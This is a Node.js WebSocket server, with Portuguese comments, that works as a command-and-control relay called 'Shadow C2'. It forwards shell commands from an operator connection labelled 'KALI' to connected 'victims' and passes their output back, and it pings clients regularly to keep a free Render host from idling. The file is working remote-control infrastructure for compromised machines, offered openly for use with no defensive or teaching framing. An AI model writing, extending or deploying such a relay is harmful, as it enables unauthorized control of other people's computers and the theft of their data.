const WebSocket = require('ws');
const http = require('http');

// Cria servidor HTTP básico para o Render não dormir
const server = http.createServer((req, res) => { res.end("Shadow C2 Online"); });
const wss = new WebSocket.Server({ server });

// Armazena conexões: Kali (Mestre) e Vítimas
let kali = null;
const victims = new Map();

wss.on('connection', (ws, req) => {
    // Pega o ID da URL (ex: ?id=DAVID ou ?id=KALI)
    const params = new URLSearchParams(req.url.split('?')[1]);
    const id = params.get('id');

    if (id === 'KALI') {
        kali = ws;
        console.log("[!] CONTROLADOR (KALI) CONECTADO");
        // Avisa o Kali quem já está online
        victims.forEach((v_ws, v_id) => {
            if(kali) kali.send(JSON.stringify({ type: 'new_victim', id: v_id }));
        });
    } else {
        // É uma vítima
        const victimId = id || `Alvo_${Math.random().toString(36).substr(2, 4)}`;
        victims.set(victimId, ws);
        console.log(`[+] NOVA VÍTIMA: ${victimId}`);
        
        // Avisa o Kali que chegou carne nova
        if (kali && kali.readyState === WebSocket.OPEN) {
            kali.send(JSON.stringify({ type: 'new_victim', id: victimId }));
        }

        ws.on('close', () => {
            victims.delete(victimId);
            if(kali) kali.send(JSON.stringify({ type: 'disconnect', id: victimId }));
        });
    }

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            if (ws === kali) {
                // KALI -> VÍTIMA
                // Formato esperado: { "target": "DAVID", "cmd": "dir" }
                const targetWs = victims.get(data.target);
                if (targetWs && targetWs.readyState === WebSocket.OPEN) {
                    targetWs.send(data.cmd); // Envia apenas o comando limpo
                }
            } else {
                // VÍTIMA -> KALI
                // A vítima manda apenas o resultado texto, nós empacotamos pro Kali
                if (kali && kali.readyState === WebSocket.OPEN) {
                    kali.send(JSON.stringify({ 
                        type: 'response', 
                        from: id, 
                        result: data.result 
                    }));
                }
            }
        } catch (e) {
            console.error("Erro de protocolo:", e.message);
        }
    });
});

// Ping para manter conexões vivas (Anti-Idle do Render)
setInterval(() => {
    wss.clients.forEach(ws => { if(ws.readyState === WebSocket.OPEN) ws.ping(); });
}, 20000);

server.listen(process.env.PORT || 10000);
